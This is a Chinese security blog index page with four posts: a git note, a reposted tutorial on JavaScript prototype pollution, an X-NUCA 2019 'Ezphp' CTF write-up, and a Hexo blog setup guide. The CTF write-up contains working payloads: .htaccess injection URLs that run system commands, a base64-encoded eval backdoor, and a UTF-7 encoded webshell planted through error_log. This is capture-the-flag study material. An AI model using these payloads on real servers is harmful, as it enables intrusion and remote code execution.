<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"www.plasf.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="随笔、分享、记录生活">
<meta name="keywords" content="CTF|网络安全|开发">
<meta property="og:type" content="website">
<meta property="og:title" content="Xiao Leung&#39;s Blog">
<meta property="og:url" content="https://www.plasf.cn/page/7/index.html">
<meta property="og:site_name" content="Xiao Leung&#39;s Blog">
<meta property="og:description" content="随笔、分享、记录生活">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Xiao Leung&#39;s Blog">
<meta name="twitter:description" content="随笔、分享、记录生活">

<link rel="canonical" href="https://www.plasf.cn/page/7/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Xiao Leung's Blog</title>
  


  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?9905f6cfc84bbdd051e0d6a5e5f8714a";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Xiao Leung's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">专注网络安全研究</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-sitemap">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d79bab95ef.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d79bab95ef.html" class="post-title-link" itemprop="url">本地上传到github小记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-08-28 23:44:42" itemprop="dateCreated datePublished" datetime="2019-08-28T23:44:42+08:00">2019-08-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:11:58" itemprop="dateModified" datetime="2020-10-14T17:11:58+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/随笔/" itemprop="url" rel="index"><span itemprop="name">随笔</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>94</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>1.New repository</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190727/15642181913929.png" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190727/15642182108444.png" alt="img"></p>
<p>把上面的HTTPS连接复制</p>
<pre><code class="shell">cd /项目文件夹
git init #生成git管理
git add .#将文件添加到仓库
git config --global user.email</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190727/1564218235629.png" alt="img"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d6927ee6b1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d6927ee6b1.html" class="post-title-link" itemprop="url">(转载)JavaScript原型链污染攻击学习笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-08-27 22:55:57" itemprop="dateCreated datePublished" datetime="2019-08-27T22:55:57+08:00">2019-08-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:14:49" itemprop="dateModified" datetime="2020-10-14T17:14:49+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Js面向对象的特点"><a href="#Js面向对象的特点" class="headerlink" title="Js面向对象的特点"></a>Js面向对象的特点</h1><pre><code class="javascript">d={&quot;d&quot;:&quot;ddd&quot;,dd:dd()}
-&gt;Object{d:&quot;ddd&quot;,dd:dd)()}
d.dd-&gt;fuction dd()
d.d-&gt;&quot;ddd&quot;
d[&#39;d&#39;]-&gt;&quot;ddd&quot;</code></pre>
<p>也就是说在JavaScript中能够使用多种方法去操作对象。</p>
<h1 id="prototype和-proto"><a href="#prototype和-proto" class="headerlink" title="prototype和_proto_"></a>prototype和_proto_</h1><ul>
<li><p>JavaScript中要定义一个类需要使用构造函数的方式去定义:</p>
</li>
<li><p>例如：</p>
</li>
</ul>
<pre><code class="javascript">function foo(){
this.bar = 1;
}
new foo()</code></pre>
<ul>
<li>当然和其他语言的类一样能够在类内部构造方法。</li>
<li>例如:</li>
</ul>
<pre><code class="javascript">function Foo() {
    this.bar = 1
    this.show = function() {
        console.log(this.bar)
    }
}

(new Foo()).show()</code></pre>
<ul>
<li>但是每次实例化类时候都会执行一次this.show = function…，这个show是绑定在对象上而非在类中。如果希望new类时候希望只创建一次show方法，那么就需要使用prototype(原型)：</li>
</ul>
<pre><code class="javascript">function Foo() {
    this.bar = 1
}

Foo.prototype.show = function show() {
    console.log(this.bar)
}

let foo = new Foo()
foo.show()</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190828/15669736689501.png" alt="img"></p>
<ul>
<li>我们可以认为原型prototype是类Foo的一个属性，而所有用Foo类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的foo对象，其天生就具有foo.show()方法。在js中，所有的对象都是从各种基础对象继承下来的，所以每个对象都有他的父类，通过prototype可以直接操作修改父类的对象。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190828/15669747911191.png" alt="img"></p>
<ul>
<li>一般函数默认的<code>prototype</code>是一个类型为<code>&quot;object&quot;</code>的对象，它有两个属性：<code>constructor</code>和 <code>__proto__</code>。其中<code>constructor</code>属性指向这个函数自身，<code>__proto__</code>属性指向<code>Object.prototype</code>，这说明<strong>一般</strong>函数的<code>prototype</code>属性是由<code>Object</code>函数生成的.</li>
</ul>
<h1 id="JavaScript原型链继承"><a href="#JavaScript原型链继承" class="headerlink" title="JavaScript原型链继承"></a>JavaScript原型链继承</h1><p><img src="http://goodcheerleung.gitee.io/mycute/20190828/1566975471640.png" alt="img"></p>
<pre><code class="javascript">function Father() {
    this.first_name = &#39;Donald&#39;
    this.last_name = &#39;Trump&#39;
}

function Son() {
    this.first_name = &#39;Melania&#39;
}

Son.prototype = new Father()

let son = new Son()
console.log(`Name: ${son.first_name} ${son.last_name}`)</code></pre>
<p>最终出来的结果很明显，son中并没有last_name这个属性那么他会到原型链上查找，那么最终打印出来的<code>son.last_name</code>那会是<code>Trump</code></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190828/15669757963394.png" alt="img"></p>
<h1 id="原型链污染攻击"><a href="#原型链污染攻击" class="headerlink" title="原型链污染攻击"></a>原型链污染攻击</h1><pre><code class="javascript">// foo是一个简单的JavaScript对象
let foo = {bar: 1}

// foo.bar 此时为1
console.log(foo.bar)

// 修改foo的原型（即Object）
foo.__proto__.bar = 2

// 由于查找顺序的原因，foo.bar仍然是1
console.log(foo.bar)

// 此时再用Object创建一个空的zoo对象
let zoo = {}

// 查看zoo.bar
console.log(zoo.bar)
//最后，虽然zoo是一个空对象{}，但zoo.bar的结果居然是2：</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190828/15669760404403.png" alt="img"></p>
<p>原因也显而易见：因为前面我们修改了foo的原型foo.<strong>proto</strong>.bar = 2，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p>
<p>后来，我们又用Object类创建了一个zoo对象let zoo = {}，zoo对象自然也有一个bar属性了。</p>
<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p>
<h1 id="哪些情况下原型链会被污染？"><a href="#哪些情况下原型链会被污染？" class="headerlink" title="哪些情况下原型链会被污染？"></a>哪些情况下原型链会被污染？</h1><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p>
<p>我们思考一下，哪些情况下我们可以设置<strong>proto</strong>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p>
<p>对象merge<br> 对象clone（其实内核就是将待操作的对象merge到一个空对象中）<br> 以对象merge为例，我们想象一个简单的merge函数：</p>
<pre><code>function merge(target, source) {
    for (let key in source) {
        if (key in source &amp;&amp; key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
123456789</code></pre><p>在合并的过程中，存在赋值的操作target[key] = source[key]，那么，这个key如果是<strong>proto</strong>，是不是就可以原型链污染呢？</p>
<p>我们用如下代码实验一下：</p>
<pre><code>let o1 = {}
let o2 = {a: 1, &quot;__proto__&quot;: {b: 2}}
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
1234567</code></pre><p>结果是，合并虽然成功了，但原型链没有被污染：</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190828/15669765556435.png" alt="img"></p>
<p>这是因为，我们用JavaScript创建o2的过程（let o2 = {a: 1, “<strong>proto</strong>”: {b: 2}}）中，<strong>proto</strong>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，<strong>proto</strong>并不是一个key，自然也不会修改Object的原型。</p>
<p>那么，如何让<strong>proto</strong>被认为是一个键名呢？</p>
<p>我们将代码改成如下：</p>
<pre><code>let o1 = {}
let o2 = JSON.parse(&#39;{&quot;a&quot;: 1, &quot;__proto__&quot;: {&quot;b&quot;: 2}}&#39;)
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
1234567</code></pre><p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190828/15669765952903.png" alt="img"></p>
<p>这是因为，JSON解析的情况下，<strong>proto</strong>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
<p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p>
<h1 id="文章来源"><a href="#文章来源" class="headerlink" title="文章来源"></a>文章来源</h1><p><a href="https://xz.aliyun.com/t/2802" target="_blank" rel="noopener">https://xz.aliyun.com/t/2802</a></p>
<p><a href="https://blog.csdn.net/qq_41107295/article/details/95789944" target="_blank" rel="noopener">https://blog.csdn.net/qq_41107295/article/details/95789944</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto</a>__</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d4770d39c3.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d4770d39c3.html" class="post-title-link" itemprop="url">X-NUCA‘2019 ——Ezphp复盘总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-08-27 13:15:01" itemprop="dateCreated datePublished" datetime="2019-08-27T13:15:01+08:00">2019-08-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:23:49" itemprop="dateModified" datetime="2020-10-14T17:23:49+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>emmm….这次比赛题目质量太高所以我这种菜鸡基本没有做出来的题目，但是思路大体正确，但是关键点没有想出来。</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code class="php"> &lt;?php
    $files = scandir(&#39;./&#39;); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== &quot;index.php&quot;) {
                unlink($file);
            }
        }
    }
    include_once(&quot;fl3g.php&quot;);
    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET[&#39;content&#39;];
    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) {
        echo &quot;Hacker&quot;;
        die();
    }
    $filename = $_GET[&#39;filename&#39;];
    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {
        echo &quot;Hacker&quot;;
        die();
    }
    $files = scandir(&#39;./&#39;); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== &quot;index.php&quot;) {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . &quot;\nJust one chance&quot;);
?&gt; </code></pre>
<h2 id="复盘检讨"><a href="#复盘检讨" class="headerlink" title="复盘检讨"></a>复盘检讨</h2><p>其实这题已经想到了使用<code>.htaccess</code>文件去包含php代码但是么有想到怎么绕过<code>stristr()</code>。下面记录一下大佬们的wirte up 所用方法并复现学习一波。</p>
<ul>
<li>题目对解析的文件做了限制，只解析index.php，所以做这道题的思路第一反应也是使用<code>.user.ini</code>或者<code>.hatccess</code>去将PHP代码去包含金index.php</li>
</ul>
<h3 id="方法一-“-“绕过stristr-检测"><a href="#方法一-“-“绕过stristr-检测" class="headerlink" title="方法一 “\“绕过stristr()检测"></a>方法一 “\“绕过stristr()检测</h3><ul>
<li><p>我们从代码的最后一行可见最后会强行拼接进来一个<code>&quot;\nJust one chance&quot;</code>导致<code>.hatccess</code>无法解析500错误。所以使用反斜杠可以将<code>\n</code>转义为普通字符后使用#注释使得<code>.hatccess</code>能够成功解析。</p>
</li>
<li><p>绕过<code>stristr()</code>检测同样使用“\“作为换行直接绕过该函数的关键字检测。</p>
</li>
<li><p>将<code>.hatccess</code>包含进所以php文件。</p>
</li>
</ul>
<pre><code>php_value auto_prepend_file .htaccess</code></pre><ul>
<li>综上构造payload：</li>
</ul>
<pre><code>php_value auto_prepend_fil\ 
e .htaccess 
#&lt;?php phpinfo();?&gt;\ </code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190827/15668911161294.png" alt="img"></p>
<pre><code>?content=php_value auto_prepend_fil\%0Ae .htaccess%0A%23&lt;?php system(&#39;cat /fla&#39;.&#39;g&#39;);?&gt;\&amp;filename=.htaccess</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190827/1566891242808.png" alt="img"></p>
<h3 id="方法二利用PCRE回溯次数限制绕过正则"><a href="#方法二利用PCRE回溯次数限制绕过正则" class="headerlink" title="方法二利用PCRE回溯次数限制绕过正则"></a>方法二利用PCRE回溯次数限制绕过正则</h3><ul>
<li><p><code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code>存在被绕过的可能。</p>
</li>
<li><p><a href="https://www.freebuf.com/articles/web/190794.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
</li>
<li><p>上文是利用回溯次数超出最大值返回False而这里大佬使用了.hatccess去将回溯次数设置为0导致</p>
</li>
</ul>
<pre><code>?content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;filename=.htaccess</code></pre><ul>
<li>使用<code>php://filter/write=conver.base64-decode=.htaccess</code>写入base64加密的后门，将.htaccess包含入php</li>
</ul>
<pre><code>?filename=php://filter/write=convert.base64- 
decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcGhwX3ZhbHVlIHBjcm 
Uuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiNhPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5c </code></pre><ul>
<li>该方法在我自己搭的环境中并未复现成功。</li>
</ul>
<h3 id="利用error-log生成shell"><a href="#利用error-log生成shell" class="headerlink" title="利用error_log生成shell"></a>利用error_log生成shell</h3><ul>
<li><code>error_lo</code>可以将php的错误信息写在指定目录下</li>
<li>利用include_path包含UTF-7编码后的一句话</li>
<li>利用包含文件不存在导致报错在/tmp下生成fl3g.php</li>
</ul>
<pre><code>php_value error_log /tmp/fl3g.php
php_value error_reporting 32767
php_value include_path &quot;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;
# \</code></pre><ul>
<li>生成后再写入如下<code>.htaccess</code>，将include目录更改为tmp和解码UTF-7(<a href="https://www.plasf.cn/2019/08/25/Easy-PHP-Write-up/">上一篇SUCTF</a>博客有提到)</li>
</ul>
<pre><code>php_value include_path &quot;/tmp&quot;
php_value zend.multibyte 1
php_value zend.script_encoding &quot;UTF-7&quot;
# \</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190827/15668987829847.png" alt="img"></p>
<p>（注意写入content使用url编码后传入）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/1558f80b43.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/1558f80b43.html" class="post-title-link" itemprop="url">HEXO+Githubpage搭建博客</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-08-26 21:14:11" itemprop="dateCreated datePublished" datetime="2019-08-26T21:14:11+08:00">2019-08-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:15:29" itemprop="dateModified" datetime="2020-10-14T17:15:29+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/随笔/" itemprop="url" rel="index"><span itemprop="name">随笔</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>952</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Github新建项目"><a href="#Github新建项目" class="headerlink" title="Github新建项目"></a>Github新建项目</h2><ul>
<li>这个项目命名方式为:<code>&lt;用户名&gt;.github.io</code> 如下图</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668210563706.png" alt></p>
<ul>
<li>打开项目页面选择<code>Clone or download</code>点击<code>Use SSH</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668211846352.png" alt></p>
<ul>
<li>复制SSH地址如下图</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/1566821283557.png" alt></p>
<h2 id="创建SSH公钥"><a href="#创建SSH公钥" class="headerlink" title="创建SSH公钥"></a>创建SSH公钥</h2><pre><code class="shell">ssh-keygen -t rsa -b 4096 -C &quot;你的邮箱@qq.com&quot;
ssh-add ~/.ssh/id_rsa</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668227842615.png" alt></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668229504873.png" alt></p>
<ul>
<li>查看key</li>
</ul>
<pre><code>cd /root/.ssh
cat id_rsa.pub</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668231662963.png" alt></p>
<ul>
<li>github创建SSH-KEY,将创建的key值复制上去,保存即可</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668233457778.png" alt></p>
<ul>
<li>添加github用户上传用户信息</li>
</ul>
<pre><code class="shell">git config --global user.name &quot;你的用户名&quot;
git config --global user.email “你的邮箱&quot;</code></pre>
<h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><pre><code>apt install npm</code></pre><h2 id="安装HEXO"><a href="#安装HEXO" class="headerlink" title="安装HEXO"></a>安装HEXO</h2><pre><code class="shell">npm install -g hexo
npm install hexo --save
hexo -v #查看安装是否成功，成功显示版本信息如下图</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668238496198.png" alt></p>
<h2 id="生成一个博客"><a href="#生成一个博客" class="headerlink" title="生成一个博客"></a>生成一个博客</h2><pre><code class="shell">hexo init &lt;文件夹&gt;
#如：hexo init myblog</code></pre>
<p>命令执行后会生成一个文件夹里面是博客文件。下一步进入文件夹，执行<code>hexo g</code>即可生成静态文件再执行<code>hexo s</code>,即可本地预览博客</p>
<pre><code>hexo g
hexo s</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668241705588.png" alt></p>
